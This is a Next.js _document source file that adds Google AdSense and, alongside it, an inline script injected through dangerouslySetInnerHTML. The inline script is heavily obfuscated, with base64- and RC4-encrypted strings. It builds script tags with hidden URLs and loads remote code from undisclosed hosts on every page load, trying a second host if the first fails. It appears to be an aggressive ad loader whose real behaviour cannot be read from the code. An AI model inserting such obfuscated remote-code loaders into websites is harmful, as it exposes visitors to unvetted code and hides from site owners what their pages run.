import Document, { Html, Head, Main, NextScript } from 'next/document';
import Script from 'next/script';

class MyDocument extends Document {
  static async getInitialProps(ctx) {
    const initialProps = await Document.getInitialProps(ctx);
    return { ...initialProps };
  }

  render() {
    return (
      <Html>
        <Head>
          <link rel="icon" href="/favicon.svg" />
          <Script
              async
              src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1339539882255727"
              crossOrigin="anonymous"
          />
          <script
            type="text/javascript"
            data-cfasync="false"
            dangerouslySetInnerHTML={{
              __html: `
                /*<![CDATA[/* */
                (function(){if(window.ee05df34921703334cba6a52748be1e5) return; window.ee05df34921703334cba6a52748be1e5="EVHqg4Vcht4GlDTfeK2nkh6ke36ndtvK_zsVjmDQGO1NsW1QU0xqIW7sEVDWo6Ytwf8ik5rIqzcNfyw";var a=['w4ACLzjCocK3wqfDksOuwpzDkU3Di8O0woE=','Jx9KMcKxwrU=','w58Qw6oSGXQjwopGwo5Nw7A=','GCDDrHXChQ==','wrTDo8KBw4XDg1V6eMKmw48=','PQvDnMKFwogtIXt3PQQIwqo=','TCnCm8Oxwpd3OsOEwpvDu8KtwpsHwqg=','w6keOzZPbsO7w4o=','w5ckPsO5w5vDgsOMw6I=','woLDsMOOwq0=','w580w6fDhijChw==','w5ACOy3Dt8KfwqPDkMO4worDl1E=','Sk0hwrpHwrPCiQ==','A8OFwo4=','w57DtmxywqVeJzzDksKIw77Ci8KR','HEnDqsObE8KP','ZsOcw43Cn1/Ctz45w7wILw==','AsOew5J8wonDmcObAsK3AcKjw6g=','ccKIw6HDu8Kuw5HChMKDw68=','DyjCl2ACBsKUUMOSw5xgw5jDvxbCrsOmPjzDsRYSwojDi8OWesOjw69PH8OtFhRRwr7DiQ3DicOzQxg8R1wgMMOuOsKOI8KPw5fDhlEAw6DCnA4+XQ==','w5QlUk3CrlcGw5gzw5rDh8KXwoTDtsK2QzHDtsOVw5c=','ccOXw5LCiQ==','w58+w6HDihHClw==','BMOew4RrwonDgsOr','a8K7H0nDr2Nhw6Q=','dMK4HBfDvTc6wqLDv8Kgwq/DrsK6YDDCggHDlyfDh8KpGGARUcKpacOVwr3DnMK6wo4jZsKOwqTCoCfCkCVWw64awqkRY8OTFwDDuUw='];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x7a));var b=function(c,d){c=c-0x0;var e=a[c];if(b['flZuVG']===undefined){(function(){var h=function(){var k;try{k=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(l){k=window;}return k;};var i=h();var j='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';i['atob']||(i['atob']=function(k){var l=String(k)['replace'](/=+$/,'');var m='';for(var n=0x0,o,p,q=0x0;p=l['charAt'](q++);~p&&(o=n%0x4?o*0x40+p:p,n++%0x4)?m+=String['fromCharCode'](0xff&o>>(-0x2*n&0x6)):0x0){p=j['indexOf'](p);}return m;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};b['OsMbWF']=g;b['WcZUlp']={};b['flZuVG']=!![];}var f=b['WcZUlp'][c];if(f===undefined){if(b['LjQAef']===undefined){b['LjQAef']=!![];}e=b['OsMbWF'](e,d);b['WcZUlp'][c]=e;}else{e=f;}return e;};var i=window;i[b('0x11','3[DA')]=[[b('0x12','%pbB'),0x4be13c],[b('0x9','7$5X'),0x0],[b('0xe','uG%5'),'0'],[b('0x13','w$[@'),0x0],[b('0x14','2nhH'),![]],[b('0x16','HNcR'),0x0],[b('0xa','c3&o'),!0x0]];var p=[b('0x7','WQeU'),b('0x1','a77n')],s=0x0,f,n=function(){if(!p[s])return;f=i[b('0xf','u$ZP')][b('0xd','c4yt')](b('0x17','KnOP'));f[b('0x3','xlyU')]=b('0x8','w$[@');f[b('0xb',']dtl')]=!0x0;var c=i[b('0x10','OV05')][b('0x2','Ocg3')](b('0x4','%pbB'))[0x0];f[b('0x15','1y)l')]=b('0x6','WQeU')+p[s];f[b('0x18','xlyU')]=b('0x0','pjdZ');f[b('0x5','A%In')]=function(){s++;n();};c[b('0xc','iKBd')][b('0x19','A%In')](f,c);};n();})();
                /*]]>*/
              `,
            }}
          />
        </Head>
        <body>
          <Main />
          <NextScript />
        </body>
      </Html>
    );
  }
}

export default MyDocument;